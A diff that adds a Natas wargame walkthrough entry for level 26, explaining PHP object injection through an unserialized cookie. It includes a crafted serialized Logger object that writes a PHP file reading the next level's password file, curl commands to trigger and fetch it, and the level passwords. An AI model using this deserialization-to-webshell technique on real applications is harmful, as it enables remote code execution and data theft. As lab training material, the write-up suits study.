@@ -449,3 +449,44 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas26:** `3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT`
 - **Verification:** `http://natas26.natas.labs.overthewire.org/` with `natas26:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L25.cast`
+
+## Level 26 → natas27
+- **Account:** `natas26`, password `3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT`.
+- **Goal:** The page draws an image from a `drawing` cookie, which is `unserialize(base64_decode(...))`-ed. The source also defines a `Logger` class whose constructor and destructor write to a file named `$logFile`.
+- **Technique and why it works:** **PHP object injection**. `drawing` is attacker-controlled serialized data, and `drawFromUserdata()` calls `unserialize()` on it with no class whitelist. PHP will happily rebuild *any* class the application has defined — here `Logger`. Its private properties (`logFile`, `initMsg`, `exitMsg`) are set by the serialized string, and `__destruct()` writes `exitMsg` into `logFile` at the end of the request. So we make `logFile` point at `img/natas26_<PHPSESSID>.php` (a directory the web server serves as PHP) and put `<?php ... ?>` in `exitMsg`. The destructor writes our PHP file; fetching it executes the code and prints the natas27 password.
+
+  The private property names must be serialized with their mangled names: `\x00Logger\x00logFile`, `\x00Logger\x00initMsg`, `\x00Logger\x00exitMsg` (NUL, class name, NUL, property). The `s:N:` length prefixes must be exact, including those NUL bytes.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `Logger` has `__construct` (writes `initMsg`), `log()`, and `__destruct` (writes `exitMsg`); `drawFromUserdata()` unserializes the cookie; the image path is `img/natas26_<session_id>.png`.
+2. **Start a session** so the image path (and therefore our chosen `logFile` name) is predictable:
+   ```
+   curl -s -c /tmp/n26.jar -u natas26:<pw> http://natas26.natas.labs.overthewire.org/
+   awk '/PHPSESSID/{print $7}' /tmp/n26.jar      # PHPSESSID=u7ekpeu5rdisg2eo8nbpsolcft
+   ```
+3. **Craft the serialized object** (the recording prints the exact base64):
+   ```
+   O:6:"Logger":3:{
+     s:15:"\x00Logger\x00logFile"; s:42:"img/natas26_<sid>.php";
+     s:15:"\x00Logger\x00initMsg"; s:0:"";
+     s:15:"\x00Logger\x00exitMsg"; s:62:"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
+   }
+   ```
+   `initMsg` is empty (we do not want the constructor's text), and the payload is in `exitMsg`, which the *destructor* writes. (Writing it in `initMsg` does not work: the object is rebuilt by `unserialize`, so `__construct` is not called — only `__destruct` runs.)
+4. **Trigger deserialization** by sending the cookie together with the draw parameters:
+   ```
+   curl -s -u natas26:<pw> -H "Cookie: PHPSESSID=<sid>; drawing=<b64>" \
+        --get --data-urlencode 'x1=1' --data-urlencode 'y1=1' \
+        --data-urlencode 'x2=2' --data-urlencode 'y2=2' \
+        http://natas26.natas.labs.overthewire.org/
+   ```
+   At the end of the request `__destruct()` writes the payload into `img/natas26_<sid>.php`.
+5. **Fetch the written file.**
+   ```
+   curl -s -u natas26:<pw> http://natas26.natas.labs.overthewire.org/img/natas26_<sid>.php
+   # mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
+   ```
+6. **Verify.** `curl -u natas27:<pw> http://natas27.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas27:** `mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV`
+- **Verification:** `http://natas27.natas.labs.overthewire.org/` with `natas27:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L26.cast`
